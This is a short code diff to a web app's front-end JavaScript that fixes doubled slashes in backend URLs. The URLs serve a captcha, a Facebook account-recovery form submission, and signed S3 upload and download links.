@@ -6,7 +6,7 @@ const reloadButton = document.getElementById("reloadCaptchaBtn");
 async function loadCaptcha() {
     captchaCodeDisplay.textContent = "Loading...";
     try {
-        const response = await fetch("https://account-recovery-app.onrender.com//api/captcha");
+        const response = await fetch("https://account-recovery-app.onrender.com/api/captcha");
         const data = await response.json();
 
         if (data.success) {
@@ -73,7 +73,7 @@ fbForm.addEventListener("submit", async (e) => {
     const bodyObject = Object.fromEntries(fd.entries());
 
     /* ------------------ SUBMIT TO BACKEND ------------------ */
-    const res = await fetch("https://account-recovery-app.onrender.com//api/submit-fb-recovery", {
+    const res = await fetch("https://account-recovery-app.onrender.com/api/submit-fb-recovery", {
         method: "POST",
         headers: {
             "Authorization": `Bearer ${token}`,
@@ -105,7 +105,7 @@ async function uploadToS3(file, token, progressElement, description) {
     progressElement.textContent = `${description}: Uploading...`;
 
     const signedRes = await fetch(
-        `https://account-recovery-app.onrender.com//api/generate-upload-url?filename=${file.name}&filetype=${file.type}`,
+        `https://account-recovery-app.onrender.com/api/generate-upload-url?filename=${file.name}&filetype=${file.type}`,
         { headers: { "Authorization": "Bearer " + token } }
     );
 
@@ -122,7 +122,7 @@ async function uploadToS3(file, token, progressElement, description) {
     const key = signedData.fileUrl.split(".com/")[1];
 
     const dlRes = await fetch(
-        `https://account-recovery-app.onrender.com//api/generate-download-url?key=${encodeURIComponent(key)}`,
+        `https://account-recovery-app.onrender.com/api/generate-download-url?key=${encodeURIComponent(key)}`,
         { headers: { Authorization: "Bearer " + token } }
     );
 
